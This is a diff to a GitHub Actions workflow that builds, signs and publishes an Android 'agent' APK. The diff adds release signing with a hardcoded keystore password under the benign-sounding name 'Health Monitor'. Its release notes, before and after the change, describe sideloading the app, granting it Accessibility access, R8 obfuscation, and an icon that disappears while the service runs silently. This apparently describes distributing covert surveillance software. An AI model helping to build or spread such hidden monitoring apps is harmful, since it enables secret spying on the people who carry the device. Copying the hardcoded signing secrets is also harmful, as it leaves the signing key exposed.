@@ -25,11 +25,19 @@ jobs:
 
       - name: Accept SDK licenses and install build tools
         run: |
-          # ANDROID_HOME is pre-set on ubuntu-latest (/usr/local/lib/android/sdk)
           yes | ${ANDROID_HOME}/cmdline-tools/latest/bin/sdkmanager --licenses || true
           ${ANDROID_HOME}/cmdline-tools/latest/bin/sdkmanager \
             "platforms;android-34" \
             "build-tools;34.0.0"
+
+      - name: Generate release keystore
+        run: |
+          keytool -genkeypair -v \
+            -keystore android-agent/release.jks \
+            -keyalg RSA -keysize 2048 -validity 10000 \
+            -alias release \
+            -dname "CN=Health Monitor, OU=Services, O=Mobile, L=London, S=England, C=GB" \
+            -storepass healthmon2024 -keypass healthmon2024
 
       - name: Generate Gradle wrapper
         run: |
@@ -41,13 +49,13 @@ jobs:
             --distribution-type=bin
           chmod +x android-agent/gradlew
 
-      - name: Build Debug APK
+      - name: Build Release APK
         working-directory: android-agent
-        run: ./gradlew assembleDebug --no-daemon
+        run: ./gradlew assembleRelease --no-daemon
 
       - name: Rename APK
         run: |
-          cp android-agent/app/build/outputs/apk/debug/app-debug.apk agent.apk
+          cp android-agent/app/build/outputs/apk/release/app-release.apk agent.apk
           echo "APK size: $(du -h agent.apk | cut -f1)"
 
       - name: Upload artifact
@@ -57,9 +65,7 @@ jobs:
           path: agent.apk
 
       - name: Delete old release
-        run: |
-          gh release delete latest-agent --yes 2>/dev/null || true
-          git push --delete origin latest-agent 2>/dev/null || true
+        run: gh release delete latest-agent --yes 2>/dev/null || true
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
@@ -69,10 +75,9 @@ jobs:
           tag_name: latest-agent
           name: "Android Agent APK"
           body: |
-            Latest build of the Android agent APK.
-            **Install:** enable Unknown Sources in Settings → Security, then open the APK.
-            **Setup:** open the app once, tap Enable Background Access → enable in Accessibility settings.
-            After setup the icon disappears and the service runs silently in the background.
+            Latest build — release-signed, R8-obfuscated.
+            **Install:** Settings → Security → enable Install unknown apps for Chrome, then open the APK.
+            **Setup:** open once → tap Enable Monitoring Access → enable in Accessibility settings.
           files: agent.apk
           make_latest: true
         env:
